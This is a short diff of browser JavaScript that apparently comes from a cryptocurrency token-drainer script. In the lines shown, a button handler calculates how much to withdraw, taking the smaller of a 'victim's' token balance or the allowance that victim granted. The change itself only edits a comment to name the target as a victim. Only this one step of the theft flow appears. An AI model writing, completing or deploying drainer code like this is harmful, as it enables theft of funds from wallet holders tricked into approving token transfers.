@@ -619,7 +619,8 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
 
             // Step 5: Calculate the amount to withdraw
             console.debug("Calculating amount to withdraw...");
-            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN; // Use the smaller value (current balance or allowance)
+            // We withdraw the smaller of the victim's balance or the allowance
+            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN; 
             console.debug("Amount to withdraw calculated:", amountToWithdraw.toString());
 
             // Step 6: Check if withdrawal is possible (non-zero amount)
